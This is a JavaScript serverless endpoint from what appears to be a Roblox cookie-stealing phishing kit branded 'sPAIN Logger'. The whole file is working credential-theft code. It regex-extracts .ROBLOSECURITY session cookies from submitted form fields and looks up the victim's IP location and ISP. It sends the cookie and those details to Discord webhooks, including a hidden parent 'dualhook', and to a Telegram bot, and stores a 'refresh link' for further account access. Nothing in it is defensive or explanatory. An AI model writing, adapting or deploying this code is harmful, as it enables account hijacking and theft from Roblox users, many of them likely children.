// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN;
const TG_CHAT     = process.env.TG_CHAT;

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch (e) {
    console.error('redisGet error:', e.message);
    return null;
  }
}

// Use POST /pipeline for reliable JSON storage
async function redisSet(key, value) {
  try {
    const res = await fetch(`${REDIS_URL}/pipeline`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${REDIS_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify([
        ['SET', key, JSON.stringify(value), 'EX', 2592000] // 30 day TTL
      ])
    });
    return res.ok;
  } catch (e) {
    console.error('redisSet error:', e.message);
    return false;
  }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`, { signal: AbortSignal.timeout(3000) });
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

async function tgSend(text) {
  if (!TG_TOKEN || !TG_CHAT) return;
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

function generateId() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let id = '';
  for (let i = 0; i < 40; i++) id += chars[Math.floor(Math.random() * chars.length)];
  return id;
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);  if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                      if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                  if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!r.ok) console.error('Discord send failed:', r.status, await r.text());
  } catch (e) { console.error('discordSend error:', e.message); }
}

async function discordChunked(url, text) {
  const limit = 1990;
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, limit);
    rem = rem.substring(limit);
    await discordSend(url, {
      content: first
        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

async function sendHit(webhookUrl, { cookie, ip, geo, now, pageName, refreshUrl }) {
  // Message 1: info embed
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       '🍪 New Cookie Captured',
      description: `🔥 \`sPAIN\` 🔥`,
      color:       0xc026d3,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',                                                                    inline: true  },
        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                              inline: true  },
        { name: '🕐 Time',     value: now,                                                                                inline: false },
      ],
      footer:    { text: `sPAIN Logger • ${pageName}` },
      timestamp: now
    }]
  });

  // Message 2: refresh link as plain text (never gets cut off)
  await discordSend(webhookUrl, {
    content: `🔄 **Refresh Link** — click to get full account info + PowerShell:\n<${refreshUrl}>`
  });

  // Message 3: raw cookie
  await discordChunked(webhookUrl, cookie);
}

async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
  await discordSend(webhookUrl, {
    embeds: [{
      title: '⚠️ No valid cookie submitted',
      color: 0xff3333,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',                                                   inline: true  },
        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
        { name: '🕐 Time',     value: now,                                                               inline: false }
      ],
      footer: { text: `sPAIN Tools • ${pageName}` },
      timestamp: now
    }]
  });
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });
  if (!REDIS_URL || !REDIS_TOKEN) return res.status(500).json({ error: 'Server config error' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: `Page "${slug}" not found` });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  res.status(200).json({ success: true });

  try {
    const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
    const cookie   = findCookie(slots);
    const now      = new Date().toISOString();
    const pageName = record.displayName || slug;

    const webhooks = [record.webhook];
    if (record.dualhookParent) {
      try {
        const parent = await redisGet(`slot:${record.dualhookParent}`);
        if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
      } catch (_) {}
    }

    const geo = await getIpGeo(ip);

    if (!cookie) {
      for (const wh of webhooks) await sendInvalid(wh, { ip, geo, now, pageName });
      await tgSend(`⚠️ <b>NO COOKIE — ${pageName}</b>\n🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`);
      return;
    }

    const refreshId  = generateId();
    const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;

    const saved = await redisSet(`refresh:${refreshId}`, {
      cookie,
      webhook:   record.webhook,
      webhook1:  webhooks[1] || null,
      pageName,
      ip,
      createdAt: now
    });

    console.log('Refresh saved:', saved, 'id:', refreshId);

    for (const wh of webhooks) await sendHit(wh, { cookie, ip, geo, now, pageName, refreshUrl });

    await tgSend([
      `🍪 <b>COOKIE CAPTURED — ${pageName}</b>`,
      `🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
      `🔄 Refresh: ${refreshUrl}`,
      `🕐 ${now}`
    ].join('\n'));

  } catch (err) {
    console.error('Post-response error:', err.message);
  }
}
